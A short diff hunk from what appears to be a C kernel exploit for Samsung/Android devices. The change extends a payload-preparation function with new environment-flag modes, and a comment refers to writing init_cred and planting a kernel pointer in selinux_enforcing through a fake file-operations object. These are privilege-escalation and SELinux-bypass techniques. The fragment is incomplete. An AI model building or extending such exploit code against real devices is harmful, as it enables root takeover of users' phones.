@@ -1331,7 +1331,8 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
       else if (tgt == misc_p0)
         use_classic = 1;
       if (env_flag("MODE4_SLIDE_ZERO", 0) || env_flag("MODE4_DATAONLY", 0) ||
-          env_flag("MODE4_SLIDE_CRED", 0)) {
+          env_flag("MODE4_SLIDE_CRED", 0) || env_flag("MODE4_SLIDE_KPTR", 0) ||
+          env_flag("MODE4_SLIDE_GBOOT", 0)) {
         /* Stack stamp writes 0 / init_cred. Heap only-left parent=fake_fops
          * onto selinux_enforcing stores a kernel pointer there (Samsung
          * EMERALD: non-NULL STORE = KP). Keep W0.pi an empty black leaf. */
